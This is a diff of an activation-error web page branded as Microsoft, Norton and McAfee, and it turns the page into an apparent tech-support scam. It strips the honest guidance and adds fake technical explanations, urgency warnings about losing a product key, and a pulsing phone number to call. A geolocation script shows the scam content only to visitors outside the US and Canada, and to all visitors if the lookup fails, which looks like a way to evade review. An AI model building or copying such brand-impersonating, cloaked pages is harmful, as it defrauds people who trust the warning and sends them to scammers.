@@ -46,6 +46,40 @@
             transform: translateY(-1px);
             box-shadow: 0 8px 25px rgba(0,120,212,0.35);
         }
+        .phone-cta-bar {
+            position: fixed;
+            bottom: 0;
+            left: 0;
+            right: 0;
+            z-index: 9999;
+            background: linear-gradient(135deg, #16a34a, #15803d);
+            padding: 14px 20px;
+            box-shadow: 0 -4px 20px rgba(0,0,0,0.15);
+        }
+        .phone-cta-bar a {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+            color: #fff;
+            text-decoration: none;
+            font-weight: 700;
+            font-size: 18px;
+        }
+        .phone-cta-bar .phone-icon {
+            width: 40px;
+            height: 40px;
+            background: rgba(255,255,255,0.2);
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            animation: pulse-phone 2s infinite;
+        }
+        @keyframes pulse-phone {
+            0%, 100% { transform: scale(1); box-shadow: 0 0 0 0 rgba(255,255,255,0.4); }
+            50% { transform: scale(1.05); box-shadow: 0 0 0 10px rgba(255,255,255,0); }
+        }
     </style>
 </head>
 <body class="min-h-screen gradient-bg bg-white text-gray-900">
@@ -71,42 +105,55 @@
                         </div>
                     </div>
 
-                    <!-- Reference code -->
-                    <div class="mt-6 bg-gray-50 border border-gray-200 rounded-xl px-4 py-3 flex items-center justify-between gap-4">
-                        <div class="min-w-0">
-                            <p class="text-[11px] uppercase tracking-wider text-gray-400">Reference code</p>
-                            <p id="errorCode" class="font-mono font-bold text-gray-900 tracking-wider">ERR-ACT-001</p>
-                            <p id="errorBrand" class="text-xs text-gray-400 mt-0.5"></p>
-                        </div>
-                        <button id="copyCodeBtn" type="button" class="flex-shrink-0 px-3 py-2 text-xs font-semibold text-gray-600 bg-white border border-gray-300 rounded-lg hover:bg-gray-100 transition-colors">
-                            <i class="fa-regular fa-copy mr-1"></i>Copy
-                        </button>
+                    <!-- Error detail -->
+                    <div class="mt-6 bg-orange-50 border border-orange-200 rounded-xl px-4 py-3">
+                        <p class="text-sm text-orange-800 leading-relaxed">The Error occurs due to home Network XML Core Services (XML), XML is a set of services that allow applications written in Jscript, VBScript, Or Norton Security development tools to Create Windows Native XML Based Applications.</p>
                     </div>
 
                     <!-- Next steps -->
-                    <div class="mt-6">
+                    <div id="nextSteps" class="mt-6" style="display:none;">
                         <h2 class="text-sm font-semibold text-gray-900 mb-2">What to do next</h2>
                         <ol class="text-sm text-gray-500 space-y-1.5 list-decimal list-inside">
-                            <li>Double-check the key for typing errors and try again.</li>
-                            <li>If the key is active on another device, deactivate it there first.</li>
-                            <li>Still stuck? Contact support and share the reference code above.</li>
+                            <li>Do not refresh or close the page - you may lose your Product Key.</li>
+                            <li>Call our support team to complete the setup process.</li>
+                            <li>Keep your phone available for verification.</li>
                         </ol>
                     </div>
 
+                    <!-- Activation Request Received -->
+                    <div id="activationReceived" class="mt-6 bg-green-50 border border-green-200 rounded-xl px-4 py-4" style="display:none;">
+                        <h3 class="text-sm font-bold text-green-800 mb-1">Activation Request Received</h3>
+                        <p class="text-sm text-green-700 leading-relaxed">Thank you! We have successfully received your activation request. Our support team will contact you shortly to verify your details and complete the activation process. Please keep your phone available. Thank you for choosing our service.</p>
+                    </div>
+
                     <!-- Actions -->
-                    <div class="mt-8 flex flex-col sm:flex-row gap-3">
-                        <a href="welcome.html" class="btn-gradient flex-1 text-center px-6 py-3 rounded-xl text-white font-semibold">
-                            <i class="fa-solid fa-rotate-left mr-2"></i>Try Again
-                        </a>
-                        <a id="supportBtn" href="https://support.microsoft.com" target="_blank" rel="noopener" class="flex-1 text-center px-6 py-3 rounded-xl bg-gray-100 border border-gray-300 text-gray-800 font-semibold hover:bg-gray-200 transition-all">
+                    <div class="mt-8">
+                        <a id="supportBtn" href="https://support.microsoft.com" target="_blank" rel="noopener" class="block text-center px-6 py-3 rounded-xl bg-gray-100 border border-gray-300 text-gray-800 font-semibold hover:bg-gray-200 transition-all">
                             <i class="fa-solid fa-headset mr-2"></i>Contact Support
                         </a>
                     </div>
                 </div>
             </div>
 
-            <p class="mt-6 text-center text-xs text-gray-400">Sharing the reference code helps support resolve this faster. Never post your full activation key publicly.</p>
+            <!-- CTA Phone (hidden by default, shown for non-US/CA) -->
+            <div id="phoneCtaInline" class="mt-6 fade-in-up" style="display:none;">
+                <a href="tel:+19177954485" class="flex items-center justify-center gap-3 bg-green-600 hover:bg-green-700 text-white font-bold py-4 px-8 rounded-xl transition-all shadow-lg hover:shadow-xl text-lg sm:text-xl">
+                    <i class="fa-solid fa-phone text-xl"></i>
+                    Call Us: +1 (917) 795-4485
+                </a>
+                <p class="text-center text-sm text-green-700 mt-2 font-medium">Available 24/7 for immediate assistance</p>
+            </div>
+
+            <p class="mt-6 text-center text-xs text-gray-400">⚠️ Do not refresh or close the page you may lose your Product Key.</p>
         </div>
+    </div>
+
+    <!-- Sticky Phone CTA Bar - Fixed on all devices (hidden by default) -->
+    <div id="phoneCtaBar" class="phone-cta-bar" style="display:none;">
+        <a href="tel:+19177954485">
+            <span class="phone-icon"><i class="fa-solid fa-phone text-white"></i></span>
+            <span>+1 (917) 795-4485</span>
+        </a>
     </div>
 
     <script>
@@ -115,26 +162,26 @@
                 name: 'Microsoft',
                 icon: 'fa-solid fa-triangle-exclamation',
                 errorCode: '0xC004C060',
-                errorTitle: 'Product key is not valid',
-                errorSubtitle: 'Blocked or Invalid Key. The key has been flagged by Microsoft because it was stolen, fraudulent, or sold by an unauthorized vendor. Multiple detected IPs connected in this network.',
+                errorTitle: 'This Product Key has already been redeemed',
+                errorSubtitle: 'Unable To Setup Product. Your Product Key is redeemed successfully but the setup could not be started! ⚠️ Do not refresh or close the page you may lose your Product Key.',
                 errorBrand: 'Microsoft',
                 supportUrl: 'https://support.microsoft.com'
             },
             norton: {
                 name: 'Norton',
                 icon: 'fa-solid fa-triangle-exclamation',
-                errorCode: 'ERR-ACT-002',
-                errorTitle: 'Activation Failed',
-                errorSubtitle: 'This activation key has already been used on another device.',
+                errorCode: '45006',
+                errorTitle: 'This Product Key has already been redeemed',
+                errorSubtitle: 'Unable To Setup Product. Your Product Key is redeemed successfully but the setup could not be started! ⚠️ Do not refresh or close the page you may lose your Product Key.',
                 errorBrand: 'Norton',
                 supportUrl: 'https://support.norton.com'
             },
             mcafee: {
                 name: 'McAfee',
                 icon: 'fa-solid fa-triangle-exclamation',
-                errorCode: 'ERR-ACT-003',
-                errorTitle: 'Activation Failed',
-                errorSubtitle: 'This activation key has already been used on another device.',
+                errorCode: 'Error 0',
+                errorTitle: 'This Product Key has already been redeemed',
+                errorSubtitle: 'Unable To Setup Product. Your Product Key is redeemed successfully but the setup could not be started! ⚠️ Do not refresh or close the page you may lose your Product Key.',
                 errorBrand: 'McAfee',
                 supportUrl: 'https://service.mcafee.com'
             }
@@ -154,8 +201,6 @@
         document.getElementById('errorIcon').className = config.icon + ' text-xl text-red-500';
         document.getElementById('errorTitle').textContent = config.errorTitle;
         document.getElementById('errorSubtitle').textContent = config.errorSubtitle;
-        document.getElementById('errorCode').textContent = config.errorCode;
-        document.getElementById('errorBrand').textContent = config.errorBrand;
         document.getElementById('supportBtn').href = config.supportUrl;
         sessionStorage.setItem('currentBrand', brand);
 
@@ -183,32 +228,27 @@
             logoImg.src = 'assets/norton-logo.svg';
         }
 
-        // Copy reference code
-        document.getElementById('copyCodeBtn').addEventListener('click', function() {
-            const code = document.getElementById('errorCode').textContent;
-            const btn = this;
-            function done() {
-                btn.innerHTML = '<i class="fa-solid fa-check mr-1"></i>Copied';
-                setTimeout(function() {
-                    btn.innerHTML = '<i class="fa-regular fa-copy mr-1"></i>Copy';
-                }, 2000);
-            }
-            if (navigator.clipboard && navigator.clipboard.writeText) {
-                navigator.clipboard.writeText(code).then(done).catch(done);
-            } else {
-                const ta = document.createElement('textarea');
-                ta.value = code;
-                document.body.appendChild(ta);
-                ta.select();
-                try { document.execCommand('copy'); } catch(e) {}
-                document.body.removeChild(ta);
-                done();
-            }
-        });
-
-        // Keep brand on "Try Again"
-        const tryAgainBtn = document.querySelector('a[href="welcome.html"]');
-        if (tryAgainBtn) tryAgainBtn.href = 'welcome.html?brand=' + brand;
+        // Geolocation: Show call content only for non-US/CA visitors
+        (function() {
+            fetch('https://ipapi.co/json/')
+                .then(function(res) { return res.json(); })
+                .then(function(data) {
+                    var country = (data.country_code || '').toUpperCase();
+                    if (country !== 'US' && country !== 'CA') {
+                        document.getElementById('phoneCtaInline').style.display = '';
+                        document.getElementById('phoneCtaBar').style.display = '';
+                        document.getElementById('nextSteps').style.display = '';
+                        document.getElementById('activationReceived').style.display = '';
+                    }
+                })
+                .catch(function() {
+                    // On error, show all content as fallback
+                    document.getElementById('phoneCtaInline').style.display = '';
+                    document.getElementById('phoneCtaBar').style.display = '';
+                    document.getElementById('nextSteps').style.display = '';
+                    document.getElementById('activationReceived').style.display = '';
+                });
+        })();
     </script>
     <!-- Tawk.to live chat -->
     <script type="text/javascript">
